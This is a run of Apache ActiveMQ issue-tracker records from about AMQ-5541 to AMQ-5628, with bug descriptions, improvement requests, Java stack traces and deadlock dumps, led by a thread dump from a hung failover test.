Hung test - org.apache.activemq.transport.failover.FailoverUpdateURIsTestdeadlock:Name: ActiveMQ Transport: tcp://localhost/127.0.0.1:61616@51978State: BLOCKED on org.apache.activemq.ActiveMQConnection@2ccf4c0e owned by: mainTotal blocked: 3  Total waited: 1Stack trace: org.apache.activemq.ActiveMQConnection.getScheduler(ActiveMQConnection.java:2554)org.apache.activemq.ActiveMQSession.clearMessagesInProgress(ActiveMQSession.java:687)org.apache.activemq.ActiveMQConnection.transportInterupted(ActiveMQConnection.java:2043)org.apache.activemq.transport.TransportFilter.transportInterupted(TransportFilter.java:105)org.apache.activemq.transport.TransportFilter.transportInterupted(TransportFilter.java:105)org.apache.activemq.transport.failover.FailoverTransport.handleTransportFailure(FailoverTransport.java:279)   - locked java.lang.Object@6242de17org.apache.activemq.transport.failover.FailoverTransport$3.onException(FailoverTransport.java:216)org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:101)org.apache.activemq.transport.WireFormatNegotiator.onException(WireFormatNegotiator.java:160)org.apache.activemq.transport.AbstractInactivityMonitor.onException(AbstractInactivityMonitor.java:314)org.apache.activemq.transport.TransportSupport.onException(TransportSupport.java:96)org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:200)java.lang.Thread.run(Thread.java:745)&#8211;Name: mainState: BLOCKED on java.lang.Object@6242de17 owned by: ActiveMQ Transport: tcp://localhost/127.0.0.1:61616@51978Total blocked: 18  Total waited: 1,043Stack trace: org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:572)org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1331)org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1325)org.apache.activemq.AdvisoryConsumer.dispose(AdvisoryConsumer.java:57)   - locked org.apache.activemq.AdvisoryConsumer@3a6d125borg.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:660)   - locked org.apache.activemq.ActiveMQConnection@2ccf4c0eorg.apache.activemq.transport.failover.FailoverUpdateURIsTest.tearDown(FailoverUpdateURIsTest.java:52)junit.framework.TestCase.runBare(TestCase.java:146)junit.framework.TestResult$1.protect(TestResult.java:122)junit.framework.TestResult.runProtected(TestResult.java:142)junit.framework.TestResult.run(TestResult.java:125)junit.framework.TestCase.run(TestCase.java:129)junit.framework.TestSuite.runTest(TestSuite.java:255)junit.framework.TestSuite.run(TestSuite.java:250)org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84)org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264)org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153)org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124)org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200)org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153)org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)
issueID:AMQ-5541
type:Improvement
changed files:
texts:Support preemptive redelivery flag for non persistent messages
policy entry setPersistJMSRedelivered gives us a hardened redelivery flag even in the event of a restarthttps://issues.apache.org/jira/browse/AMQ-5068This feature is conditional on the message being persistent but it need not be. For non persistent messages, we can eagerly set the redelivered flag. This is useful for connection drops and or stomp clients that close their socket. If they ever care about their delivery flag.
issueID:AMQ-5542
type:Bug
changed files:
texts:KahaDB data files containing acknowledgements are deleted during cleanup
AMQ-2832 was not fixed cleanly.The commit dd68c61e65f24b7dc498b36e34960a4bc46ded4b by Gary from 8.10.2010 introduced a problem by deleting too many files.Scenarios we are facing currently in production:Data file #1 contains unconsumed messages sitting in a DLQ. So this file is not a cleanup candidate.The next file #2 contains acks of some messages from file #1. This file is not a cleanup candidate (because of ackMessageFileMap logic).The next file #3 contains acks of some messages from file #2. And this file is deleted during the cleanup procedure. So on Broker restart all messages from #2, whose acks were from the deleted file #3, are replayed!The reason is gcCandidates variable, which is a copy of gcCandidateSet (see MessageDatabase#checkpointUpdate at the end of the method - org/apache/activemq/store/kahadb/MessageDatabase.java:1659 on 5.10.0 tag). So when a candidate is deleted from gcCandidateSet (org/apache/activemq/store/kahadb/MessageDatabase.java:1668 on 5.10.0 tag), gcCandidates still contains that candidate and the comparison on org/apache/activemq/store/kahadb/MessageDatabase.java:1666 works wrong!I will try to adjust AMQ2832Test.
issueID:AMQ-5550
type:Bug
changed files:AmqpProtocolConverter.java
texts:Close of an AMQP consumer that failed to open because it was unauthorized causes exception in broker logs.
When an AMQP client creates a receiver link and the logged in user is not authorized on error is sent to the client and the link is closed, this generates an event which causes us to try and remove the consumer but that consumer was never registered so you see these sorts of things in the logs:java.lang.IllegalStateException: Cannot remove a consumer that had not been registered: ID:OfficePC-58049-1422548859782-1:3:1:0 at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:691) at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:334) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:188) at org.apache.activemq.transport.amqp.AmqpTransportFilter.sendToActiveMQ(AmqpTransportFilter.java:114) at org.apache.activemq.transport.amqp.AmqpProtocolConverter.sendToActiveMQ(AmqpProtocolConverter.java:1486) at org.apache.activemq.transport.amqp.AmqpProtocolConverter$ConsumerContext.onClose(AmqpProtocolConverter.java:1017) at org.apache.activemq.transport.amqp.AmqpProtocolConverter.processLinkEvent(AmqpProtocolConverter.java:390) at org.apache.activemq.transport.amqp.AmqpProtocolConverter.onFrame(AmqpProtocolConverter.java:331) at org.apache.activemq.transport.amqp.AmqpProtocolConverter.onAMQPData(AmqpProtocolConverter.java:275) at org.apache.activemq.transport.amqp.AmqpTransportFilter.onCommand(AmqpTransportFilter.java:98) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)This would likely also happen for a sender link.We need to track this state and not try and remove consumers or producers from the Broker that not actually registered due to security or other errors.  This causes not just log spam but a connection close as we treat the returned error from the Broker as a fatal protocol error which it is not.
issueID:AMQ-5551
type:Bug
changed files:DiskBenchmark.java
texts:The DiskBenchmark util doesn&#39;t sync (fsync) to disk for sync writes
We added a JVM flag, org.apache.activemq.file.skipMetadataUpdate, to control whether to force metadata syncs or not when sync"ing to disk. Unfortunately, that flag was not applied to the section of code that does the sync writes. Fix on the way.
issueID:AMQ-5552
type:Improvement
changed files:
texts:introduce a smoke-test profile that is enabled by default and during release:prepare
Users should be able to do $>mvn install on trunk or the source distribution and get a validated (smoke-tested) distribution in < 10  minutes.The smoke-test profile should be enabled for release:prepareAt the moment, more than 3k tests are run, they are not reliable enough and the build is gone for a number of hours. This gives a bad first impression.Or course we should continue to improve the test suite but this has a totally different focus.The smoke-test profile takes a smart cross section of tests in each module that validate core functionality. It will be an interesting challenge to get the selection right; balancing typical use cases with coverage with speed etc.The tests should be: representative of the module functionality clean - no hard-coded ports and use only space on target fast reliable can be run in parallel (maybe if it allows more tests to be run in the same time frame)
issueID:AMQ-5558
type:New Feature
changed files:consumer.txt
ProducerCommand.java
ProducerThread.java
ConsumerCommand.java
producer.txt
ConsumerThread.java
texts:Make some activemq jar executable and able to send/receive messages
It would be nice to have basic verification/example tool builded directly in activemq-client.jar, so that folks can do something like java -jar lib/activemq-client-xxx.jar producerjava -jar lib/activemq-client-xxx.jar consumer
issueID:AMQ-5559
type:Sub-task
changed files:
texts:AMQP: dont list filters which are not actually being applied in AMQP attach responses
The broker currently sends source filters in its attach response even if they are not being applied. Only filters which are actually in effect should be listed in responses to allow clients to validate the behaviour they will actually receive.
issueID:AMQ-5560
type:Sub-task
changed files:AmqpProtocolConverter.java
texts:AMQP: use type descriptors to inspect AMQP filter types rather than the map keys
The broker is currently looking up AMQP filters using named keys of the filter map. This approach is fragile, since difference clients may name equivalent filters differently, as the names are not intended to identify particular types. The broker should instead inspect the descriptor values when trying to identify the particular type of a filter.
issueID:AMQ-5563
type:Bug
changed files:ActiveMQConfiguration.java
texts:activemq-camel - Wrong default value in javadoc
In org.apache.activemq.camel.component.ActiveMQConfigurationWe have default values    private boolean useSingleConnection = false;    private boolean usePooledConnection = true;And the javadoc says    /**     * Enables or disables whether a Spring {@link SingleConnectionFactory} will be used so that when     * messages are sent to ActiveMQ from outside of a message consuming thread, pooling will be used rather     * than the default with the Spring {@link JmsTemplate} which will create a new connection, session, producer     * for each message then close them all down again.     * <p/>     * The default value is true so that a single connection is used by default.     *     * @param useSingleConnection     */    public void setUseSingleConnection(boolean useSingleConnection) {        this.useSingleConnection = useSingleConnection;    }    /**     * Enables or disables whether a PooledConnectionFactory will be used so that when     * messages are sent to ActiveMQ from outside of a message consuming thread, pooling will be used rather     * than the default with the Spring {@link JmsTemplate} which will create a new connection, session, producer     * for each message then close them all down again.     * <p/>     * The default value is false by default as it requires an extra dependency on commons-pool.     */    public void setUsePooledConnection(boolean usePooledConnection) {        this.usePooledConnection = usePooledConnection;    }Notice the javadoc has wrong defaults. Its in fact pooled that is the default.
issueID:AMQ-5564
type:Bug
changed files:
texts:activemq-pool - Either adds new mbeans or add/remove pair of mbean for each producer in use
On the AMQ dev mailing list we have talked about a new issue.http://activemq.2283324.n4.nabble.com/VOTE-Apache-ActiveMQ-5-11-0-rc3-tp4690743.htmlI found out that using the camel-example-management, which has an embedded AMQ broker and using Camel with the VM transport to produce/consume messages, then there is mbean issues.It works fine in AMQ 5.10.0. But is wrong in AMQ 5.10.1 and 5.11.0.See the attached screenshots.Notice how the mbean tree for dynamic producers keeps growing for 5.10.1 and 5.11.0.
issueID:AMQ-5567
type:Bug
changed files:
texts:JDBC XA - Store COMMIT FAILED:  java.io.IOException: Could not remove prepared transaction state from message add for sequenceId
Occasional commit failure. Stack trace of the formWARN  | .129:36295@61616 | XATransaction                    | tivemq.transaction.XATransaction   91 | 121 - org.apache.activemq.activemq-osgi  | Store COMMIT FAILED: java.io.IOException: Could not remove prepared transaction state from message add for sequenceId: 1753267 at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doCommitAddOp(DefaultJDBCAdapter.java:1049) at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.commitAdd(JDBCPersistenceAdapter.java:775) at org.apache.activemq.store.jdbc.JdbcMemoryTransactionStore$1.run(JdbcMemoryTransactionStore.java:108) at org.apache.activemq.store.memory.MemoryTransactionStore$Tx.commit(MemoryTransactionStore.java:101) at org.apache.activemq.store.memory.MemoryTransactionStore.commit(MemoryTransactionStore.java:269) at org.apache.activemq.transaction.XATransaction.storeCommit(XATransaction.java:86) at org.apache.activemq.transaction.XATransaction.commit(XATransaction.java:76)
issueID:AMQ-5568
type:Bug
changed files:
texts:Deleting lock file on broker shut down can take a master broker down
This problem may only occur on a shared file system master/slave setup. I can reproduce reliably on a NFSv4 mount using a persistence adapter configuration like <levelDB directory="/nfs/activemq/data/leveldb" lockKeepAlivePeriod="5000">  <locker>    <shared-file-locker lockAcquireSleepInterval="10000"/>  </locker></levelDB>However the problem is also reproducible using kahaDB.Two broker instances competing for the lock on the shared storage (e.g. leveldb or kahadb). Lets say brokerA becomes master, broker B slave.If brokerA looses access to the NFS share, it will shut down. As part of shutting down, it tries delete the lock file of the persistence adapter. Now since the NFS share is gone, all file i/o calls hang for a good while before returning errors. As such the broker shut down gets delayed.In the meantime the slave broker B (not affected by the NFS problem) grabs the lock and becomes master.If the NFS mount is restored while broker A (the previous master) still hangs on the file i/o operations (as part of its shutdown routine), the attempt to delete the persistence adapter lock file will finally succeed and broker A shuts down. Deleting the lock file however also affects the new master broker B who periodically runs a keepAlive() check on the lock. That check verifies the file still exists and the FileLock is still valid. As the lock file got deleted, keepAlive() fails on broker B and that broker shuts down as well. The overall result is that both broker instances have shut down despite an initially successful failover.Using restartAllowed=true is not an option either as this can cause other problems in an NFS based master/slave setup.
issueID:AMQ-5573
type:Improvement
changed files:
texts:Configurable messages size for Stomp producer
It is coming from http://activemq.2283324.n4.nabble.com/ActiveMQ-Stomp-producer-messages-size-limitation-td4689847.html#a4691046 Stomp APIs does not allow to send message more than 100MB. These parameters are in (http://activemq.apache.org/maven/apidocs/src-html/org/apache/activemq/transport/stomp/StompWireFormat.html)  "MAX_DATA_LENGTH" and "MAX_COMMAND_LENGTH" .There might be cases when producer want to send more than 100MB of message. It"s better to have such parameters configurable.?Thanks,Anuj
issueID:AMQ-5574
type:Improvement
changed files:
texts:OSGi import ranges for javax.jms should include version 2.0
The import ranges for the ActiveMQ client bundles should allow, not exclude version 2.0 of the javax.jms API, since JMS 2.0 is backwards compatible with 1.1.  This allows for ActiveMQ client jars to be used in runtimes with other JMS 2.0 clients.Should be:javax.jms;version=&#91;1.1,2&#93; instead of:javax.jms;version=[1.1,2)
issueID:AMQ-5578
type:Improvement
changed files:
texts:preallocate journal files
Our journals are append only, however we use the size to track journal rollover on recovery and replay. We can improve performance if we never update the size on disk and preallocate on creation.Rework journal logic to ensure size is never updated. This will allow the configuration option from https://issues.apache.org/jira/browse/AMQ-4947 to be the default.
issueID:AMQ-5580
type:Bug
changed files:MultiKahaDBPersistenceAdapter.java
texts:Thread unsafe operations on the PersistenceAdapters in the mKahaDB implementation
The MultiKahaDBPersistenceAdapter stores the list of PersistenceAdapters in a LinkedList and does not guard against concurrent read / write operations which can lead to exceptions in the logs and possible other subtle issues due to the fact that traversal can be interrupted.  The simple solution is to use a CopyOnWriteArrayList here as this list is only added to and the set of adapters is generally not very large.  This will prevent an errors during iterations over the set of adapters.
issueID:AMQ-5585
type:Bug
changed files:
texts:Messages not reachable after moving
When you move messages that are added when memory limit was hit, they will be unreachable until the broker restart
issueID:AMQ-5587
type:Improvement
changed files:
texts:AMQP shutdown transport if no connection attempt received after a configurable delay.
When a socket level connection is made to the AMQP TransportConnector where the client end does not initiate a new AMQP connection we should shutdown the Transport after a configurable inactivity duration (default at 30sec). A similar feature was added for MQTT in AMQ-5468
issueID:AMQ-5589
type:Improvement
changed files:
texts:AMQP Module tests run much longer than necessary.
The tests in the AMQP module take a lot longer than is needed in many cases and can be tuned quite a bit to make running the tests less painful.  We can use broker stats more intelligently and reduce sleep times and receive times in many of the tests.
issueID:AMQ-5590
type:Improvement
changed files:
texts:Reduce the time to run STOMP tests where possible.
Clean up in the STOMP tests, reduce use of sleep vs broker stats checking and use receipts when possible.
issueID:AMQ-5591
type:Improvement
changed files:
texts:AMQP Implement the JMS Mapping spec as it evolves.
The AMQP JMS Mapping specification is currently under development at OASIS.  This issue covers work to be done to implement the mechanics necessary on the broker side to allow for JMS clients that operate over AMQP.
issueID:AMQ-5592
type:Sub-task
changed files:
texts:AMQP: Pull in Proton JMS transformer code and refactor to enable both JMS mapping and support for AMQP clients
We currently use the Proton-JMS library to help with conversions of AMQP messages and creating destinations from links and message To fields.  This works to a point but becomes inflexible when trying to deal with the variety of clients that are interacting with the broker and the upcoming JMS mapping spec adds complexity to this.  We need to be more agile with fixes and support the old JMS client were possible.  Waiting on Proton releases and trying to create a one size fits all options for the mapping has proven ineffective.  We should use the current JMS transformation code as a base to better implement AMQP support in the broker and allow for faster fixes to issues as they arise.
issueID:AMQ-5593
type:Sub-task
changed files:
texts:AMQP: Implement support for Temporary Topics
The current implementation only supports Temporary Queue destinations.  Following the definition of the JMS mapping for AMQP we can add support for Temporary Topics as well.
issueID:AMQ-5594
type:Bug
changed files:
texts:Virtual topic wildcard consumers don&#39;t receive some messages
When using mqtt with virtual topic subscription strategy, it shows some failures when dealing with wildcard subscriptions. The problems are related to how we deal with wildcards in virtual topic consumer, leading to messages sent to child topics are not forwarded properly.
issueID:AMQ-5596
type:Task
changed files:
texts:Remove the deprecated JMS streams code
The JMS Streams code has been deprecated now for over a year since AMQ-4839.  We should now be able to remove this code for the 5.12 release.
issueID:AMQ-5597
type:Sub-task
changed files:pom.xml
TopicRegion.java
AmqpProtocolConverter.java
texts:AMQP: clean up durable subscription unsubscribe handling to simplify and resolve issues
The current unsubscribe processing is identifying a "null-source lookup" attach as indication to immediately unsubscribe a durable subscription, performing some trickery with capabilities. There are actually many other reasons reasons a client might do this type of attach, which might lead to prematurely ending a subscription. Fully closing (rather than a non-closing detach) the durable subscription link is to be the signal ending the subscription. The related code should be fixed to resolve this, and generally cleaned up to simplify things.
issueID:AMQ-5598
type:Bug
changed files:
texts:MQTT+NIO+SSL: Concurrent connections lead to 100% CPU usage
Connecting with multiple instances of  mqtt clients via ssl at the same time causes the borker server to run on 100% CPU usage forever. Only restart of ActiveMQ helps. Thread count maximizes during connection attempt.Critical: It doesn"t matter if the certificate is valid or not, I am able to shut down the broker from one client with 500 concurrent connecting instances. The payload size is not important. The problem is somewhere at the ssl handshake located. Without ssl everything works fine. Single ssl connections work.Similar issues (with older versions) described are here: http://activemq.2283324.n4.nabble.com/SSL-handshake-stalls-broker-with-NIO-td4677916.html http://stackoverflow.com/questions/19395769/activemq-mqtt-maxes-cpu-on-first-client-connect
issueID:AMQ-5599
type:Bug
changed files:BrokerService.java
texts:Broker start thread hangs forever in async mode when startup of PersistenceAdapter is very fast
We encountered a situation where the startup of our broker fails sometimes. We investigated this and have seen that this is caused by a race condition.When the BrokerService is configured to be async, the starting of the broker will hang when the starting of the PersistenceAdapter is faster than expected.The ActiveMQ code will first start the persistence adapter, and then start the broker. When startup is configured to be "async", these actions will happen async (in separate threads). Since these calls are async, we can not garuantee the order in which they will be finished. Although the ActiveMQ code now relies on the fact that the starting of the persistence adapter takes longer, and it waits in the starting of the broker for the starting of the persistence adapter to finish. When the starting of the persistence adapter already finished before the starting of the broker starts waiting for it, it will wait forever (and thus the broker cannot get started).In the following snippet from org.apache.activemq.broker.BrokerService this becomes clear:"startPersistenceAdapter" is fast and already notifies: persistenceAdapterLock.notifyAll();. "startBroker" will wait for notification but no one will ever notify it again: persistenceAdapterLock.wait();&#8212;startPersistenceAdapter(startAsync);startBroker(startAsync);private void startPersistenceAdapter(boolean async) throws Exception {    if (async) {        new Thread("Persistence Adapter Starting Thread") {            @Override            public void run() {                try {                    doStartPersistenceAdapter();                } catch (Throwable e) {                    startException = e;                } finally {                    synchronized (persistenceAdapterLock) {                        persistenceAdapterLock.notifyAll();                    }                }            }        }.start();    } else {        doStartPersistenceAdapter();    }}private void startBroker(boolean async) throws Exception {    if (async) {        new Thread("Broker Starting Thread") {            @Override            public void run() {                try {                    synchronized (persistenceAdapterLock) {                        persistenceAdapterLock.wait();                    }                    doStartBroker();                } catch (Throwable t) {                    startException = t;                }            }        }.start();    } else {        doStartBroker();    }}
issueID:AMQ-5600
type:Improvement
changed files:
texts:Human readable logging of XA flags in TransactionContext
When enabling debug logging at TransactionContext to see the XA start/end/commit/rollback calls, the flags are logged as integer value.With the attached patch, the flags are logged in a human readable form, which was veeery useful for my XA debugging sessions the last days.
issueID:AMQ-5602
type:Sub-task
changed files:
texts:AMQP: Create simple Proton based client to be used in testing
The current AMQP implementation depends on testing using the prototype JMS 1.0 client from QPid.  This present a few difficulties when it comes to unit testing the AMQP bits in that it is quite difficult to test the AMQP functionality directly as the client attempts to map AMQP to JMS but that is not the only valid type of client interaction nor is it compliant with the developing JMS mapping work.We should develop a thin proton wrapper client that lets us more easily recreate various client interactions with the broker and test compliance with AMQP 1.0 expected behaviors.
issueID:AMQ-5603
type:Improvement
changed files:
texts:Consider preallocation of journal files in batch increments
Right now (as of ActiveMQ 5.12 release) we preallocate journal files, but the only scope is for entire journal file. The &#91;potential&#93; issue with that is if user configures large journal file sizes, we can end up stalling writes during log rotation because of the allocation process. There are two ways to do the allocation, configurable to do it in userspace, or defer to kernel space, but nevertheless it would be good to avoid this issue altogether by preallocating in small batch sizes regardless of the journal max file size.
issueID:AMQ-5604
type:Sub-task
changed files:
texts:AMQP: Clean up unit test start / stop code, excessive thread creation casuse slowdowns.
The current test support code uses single thread executor instances as defense against hangs on test tearDown but is a bit aggressive with it as it also does Broker start / stop in an executor and never reuses them so every test run requires three to four threads just to start stop.  There"s also some thread interruption bits that blindly interrupt anything that is not the main thread which could lead to problems with the JUnit threads etc.  We can reduce this all down to one executor to close the legacy QPid JMS client connection which does sometimes hang on close. This shaves off anywhere from 1.5 to 2 minutes from the test run.
issueID:AMQ-5605
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:High CPU load when using failover transport in network connector
I"ve got a configuration with two master/slave setups consisting of 3 ActiveMQ instances each. They are deployed on three servers, with one ActiveMQ instance from each master/slave setup on every server. They are using the leveldb and zookeeper. Everything works fine.Now I"ve got the strange behaviour that when I add a network connector to each ActiveMQ instance like this:networkConnector name="toMasterSlave02" dynamicOnly="true" uri="masterslave:(tcp://host1:61617,tcp://host2:61617,tcp://host3:61617)"When you now restart the master of the master/slave setup that is targeted by the above network connector the cpu load on the current master goes and stays up at 100%, i.e. it uses one CPU per configured transportConnector.Now the explanation, mostly copied from http://activemq.2283324.n4.nabble.com/High-CPU-load-with-network-connector-failover-transport-tp4691798.htmlWhen one of the brokers is restarted, the other broker uses ~400% CPU. The cause is the FailoverTransport reconnectTask spinning, and nothing is stopping the task.Reverting this fix made for AMQ-5315, while it does reintroduce the NullPointerException, does handle failover properly without spinning:https://git1-us-west.apache.org/repos/asf/activemq/repo?p=activemq.git;a=commitdiff;h=c391321d1b5b59542d847717654b0d4dba54cf2f <https://git1-us-west.apache.org/repos/asf/activemq/repo?p=activemq.git;a=commitdiff;h=c391321d1b5b59542d847717654b0d4dba54cf2f>The reason it works after reverting that change is the NullPointerException is caught, -> serviceLocalException() -> ServiceSupport.dispose(getControllingService()); with the fix made in AMQ-5315, the dispose() call is never made. Sorry, but I"ve got no clue how to provide a unit test for this. Maybe someone else can help.
issueID:AMQ-5606
type:Sub-task
changed files:
texts:AMQP: Update the AMQP 1.0 JMS client with newest QPid-JMS Release
Upon its release we should update the QPid AMQP 1.0 JMS library to use the new QPid JMS 0.2.0 client that has recently been released.  This client is the future JMS client from the QPid project that implements the AMQP JMS spec to date and will continue to follow developments in tat specification.
issueID:AMQ-5607
type:Improvement
changed files:
texts:MQTT Tests can be sped up with some minimal changes
With just a small bit of effort the MQTT tests can be sped up using more sensible wait times and stateful checks for expected outcomes.
issueID:AMQ-5608
type:Bug
changed files:
texts:connecting with username and SimpleAuthenticationPlugin defined without any users leads to NPE
If a SimpleAuthenticationPlugin is defined in the configuration without any users element, then when a client which does supply a username attempts to connect an NPE occurs in the broker.E.g, defining broker config as:<simpleAuthenticationPlugin anonymousAccessAllowed="true" />And trying to log in, results in:java.lang.NullPointerException        at org.apache.activemq.security.SimpleAuthenticationBroker.addConnection(SimpleAuthenticationBroker.java:83)...<snip>
issueID:AMQ-5614
type:Improvement
changed files:
texts:Support message expiration in DLQ
Currently messages in the DLQ don"t expire. With the option to expire, only timely messages remain and can be processes.Immediate expiry today can be achieved on a per destination basis with the discarding strategy of with the discarding dlq broker plugin.Using message expiry is a little more intuitive and more useful, because stale messages will be auto removed from the ops radar and timely messages can be dealt with as appropriate.
issueID:AMQ-5615
type:Sub-task
changed files:AmqpProtocolConverter.java
texts:AMQP: Connection open pump to socket twice in the error case when only once is needed.
Should rearrange the code to do only one pump of the proton state once it"s checked the full state of the connection response.
issueID:AMQ-5616
type:Improvement
changed files:
texts:Declare variables as ConcurrentMap not ConcurrentHashMap to avoid issues after compiling on Java 8
Java 8 redefines the method keySet() on ConcurrentHashMap to return a narrower type than the standard return type given in the Map interface. If the code is compiled in Java 8 and then run under Java 7 this causes linking issues.  We don"t depend on the narrowed type and can live with the standard for our usages of ConcurrentHashMapWe can avoid these issues by always declaring the instances of ConcurrentHashMap where we need method like putIfAbsent in terms of the interface ConcurrentMap
issueID:AMQ-5617
type:Sub-task
changed files:
texts:AMQP: Remove direct usage of types from the legacy QPid JMS 1.0 client from the tests
The current AMQP tests use the QPid 1.0 JMS client and reference types from that library directly instead of using the JMS equivalents.  I light of the upcoming JMS 1.0 client that implements the JMS Mapping for AMQP we should remove these and make it easier to swap in the newer client once it is released, or test both using the same tests.
issueID:AMQ-5620
type:Bug
changed files:Journal.java
texts:deadlock on shutdown - kahadb and local tx rollback
Deadlock found in a potential test case:Found one Java-level deadlock:============================="ActiveMQ BrokerService[localhost] Task-1":  waiting to lock monitor 0x00007feeeb80d108 (object 0x00000007f67294c8, a org.apache.activemq.store.kahadb.disk.journal.Journal),  which is held by "pool-2-thread-1""pool-2-thread-1":  waiting to lock monitor 0x00007feee8a34428 (object 0x00000007f67091f8, a java.lang.Object),  which is held by "ActiveMQ BrokerService[localhost] Task-1"Java stack information for the threads listed above:==================================================="ActiveMQ BrokerService[localhost] Task-1": at org.apache.activemq.store.kahadb.disk.journal.Journal.getCurrentWriteFile(Journal.java:420) - waiting to lock <0x00000007f67294c8> (a org.apache.activemq.store.kahadb.disk.journal.Journal) at org.apache.activemq.store.kahadb.disk.journal.DataFileAppender.enqueue(DataFileAppender.java:209) - locked <0x00000007f67091f8> (a java.lang.Object) at org.apache.activemq.store.kahadb.disk.journal.DataFileAppender.storeItem(DataFileAppender.java:148) at org.apache.activemq.store.kahadb.disk.journal.Journal.write(Journal.java:647) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:977) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:959) at org.apache.activemq.store.kahadb.KahaDBTransactionStore.rollback(KahaDBTransactionStore.java:313) at org.apache.activemq.transaction.LocalTransaction.rollback(LocalTransaction.java:94) - locked <0x00000007f6729698> (a org.apache.activemq.store.kahadb.KahaDBTransactionStore) at org.apache.activemq.broker.TransactionBroker.removeConnection(TransactionBroker.java:323) at org.apache.activemq.broker.MutableBrokerFilter.removeConnection(MutableBrokerFilter.java:137) at org.apache.activemq.broker.TransportConnection.processRemoveConnection(TransportConnection.java:862) - locked <0x00000007f6729810> (a org.apache.activemq.broker.jmx.ManagedTransportConnection) at org.apache.activemq.broker.TransportConnection.doStop(TransportConnection.java:1187) at org.apache.activemq.broker.TransportConnection$4.run(TransportConnection.java:1117) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:745)"pool-2-thread-1": at org.apache.activemq.store.kahadb.disk.journal.DataFileAppender.close(DataFileAppender.java:257) - waiting to lock <0x00000007f67091f8> (a java.lang.Object) at org.apache.activemq.store.kahadb.disk.journal.Journal.close(Journal.java:474) - locked <0x00000007f67294c8> (a org.apache.activemq.store.kahadb.disk.journal.Journal) at org.apache.activemq.store.kahadb.MessageDatabase.close(MessageDatabase.java:438) at org.apache.activemq.store.kahadb.MessageDatabase.unload(MessageDatabase.java:466) at org.apache.activemq.store.kahadb.MessageDatabase.doStop(MessageDatabase.java:268) at org.apache.activemq.store.kahadb.KahaDBStore.doStop(KahaDBStore.java:288) at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:71) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:792) at org.apache.activemq.store.kahadb.PriorityMessageRestartBrokerTest.stopRestartBroker(PriorityMessageRestartBrokerTest.java:525) at org.apache.activemq.store.kahadb.PriorityMessageRestartBrokerTest.access$200(PriorityMessageRestartBrokerTest.java:70) at org.apache.activemq.store.kahadb.PriorityMessageRestartBrokerTest$BrokerRestartTask.run(PriorityMessageRestartBrokerTest.java:513) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471) at java.util.concurrent.FutureTask.runAndReset(FutureTask.java:304) at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$301(ScheduledThreadPoolExecutor.java:178) at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:745)Found 1 deadlock.
issueID:AMQ-5621
type:Improvement
changed files:
texts:Unit tests cleanup
Many of the existing test cases take longer than they should and fail randomly due to BrokerService instances that are still running that have open JMX connectors etc.  We should take some time to review tests and clean up were we can.  Removing hard sleeps and using admin view to check statistics can dramatically shorten a test.  Also the tests can be configured not to create JMX connectors as none of them need that in the normal case.  Other tasks that could be done is to update tests to JUnit 4 based tests with test timeouts to help prevent CI hangs.
issueID:AMQ-5622
type:Bug
changed files:
texts:STOMP clients can only delete durable subscriptions when clientId equals subscriptionName
For durable topic subscriptions STOMP clients must specify the same clientId on the connection and subcriptionName on the subscribe prior to v5.7.0. (https://issues.apache.org/jira/browse/AMQ-3917)Removing the subscription however is only possible if the same clientId on the connection and subcriptionName on the subscribe is used. The STOMP unit tests fulfill this condition (both have the same value, "test"). I suggest to modify the unit test to use different values for clientId and subcriptionName to verify this bug.
issueID:AMQ-5626
type:Bug
changed files:
texts:kahadb - inconsumable low/med priority message after restart
with priority support enabled, on occasion after a restart some low priority messages inconsumable.The cursor.queueSize() is reporting messages available on queue but they cannot be consumed.
issueID:AMQ-5628
type:Bug
changed files:
texts:MapMessage.getDouble uses Float when converting from String/UTF8
